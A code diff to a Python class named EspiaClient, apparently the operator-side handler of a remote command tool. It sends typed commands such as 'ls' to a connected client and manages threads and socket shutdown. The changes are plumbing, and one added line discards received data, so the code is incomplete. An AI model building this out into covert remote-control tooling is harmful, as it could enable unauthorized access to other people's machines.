@@ -1,4 +1,5 @@
 import threading
+import socket
 class EspiaClient(threading.Thread):
     def __init__(self, connection, client_info, controller, server):
         self.connection = connection
@@ -11,7 +12,9 @@ class EspiaClient(threading.Thread):
         self.server = server
 
     def run(self):
-        threading.Thread(name='Reciever', target=self.recieve).start()
+        self.recv_thread = threading.Thread(name='Reciever', target=self.recieve)
+        self.recv_thread.start()
+
         self.pause()
         while (self.paused == False and self.closed == False):
             input_text = input("%s:%s >> " % (self.client_info[0], self.client_info[1]))
@@ -23,39 +26,49 @@ class EspiaClient(threading.Thread):
                 self.connection.send("ls".encode())
             elif (command == "exit"):
                 self.close() 
-                self.notify_controller() 
-                return
             elif (command == "wait"):
                 self.pause()
 
-        print("[*] %s:%s got disconnected" % (self.client_info[0], self.client_info[1]))
         return
     
+    # Seperate recieve thread to recieve data from the client (Make it mutually exlusive)
     def recieve(self):
         try:
-            print(self.connection.recv(1024))
+            recv_buff = self.connection.recv(1024)
+            if (len(recv_buff) != 0):
+                recv_buff
         except ConnectionResetError:
             self.close()
 
+    # Closes the connection socket, clears thread data
     def close(self):
         self.closed = True
-        self.connection.close()
-        self.server.remove_client(self)
-        if self.paused == True:
+        try:
+            self.connection.shutdown(socket.SHUT_RDWR)    # Try closing the both ends of the connection to exit from recieve() function thread
+        except OSError:
+            pass
+        self.connection.close()                         # Close the socket
+        self.server.remove_client(self)                 # Remove itself from thread pool
+        self.notify_controller()                        # Notify the controller to take control
+        print("[*] %s:%s got disconnected" % (self.client_info[0], self.client_info[1]))
+        if self.paused == True:                         # If already paused, continue (This causes the while loop in run() to break)
             self.resume()
 
+    # Pauses the current thread (Awake the controller and pause)
     def pause(self):
         with self.state:
-            with self.controller:
+            with self.controller:                      # Notify the controller to awake
                 self.controller.notify()
             self.paused = True
-            self.state.wait()
+            self.state.wait()                           # Pause the current thread
     
+    # Resumes the current thread (Take control after controller is paused)
     def resume(self):
         with self.state:
             self.paused = False
-            self.state.notify()
+            self.state.notify()                         # Notify  itself to awake
     
+    # Notify the controller to take back control (Awake the controller)
     def notify_controller(self):
         with self.controller:
             self.controller.notify()
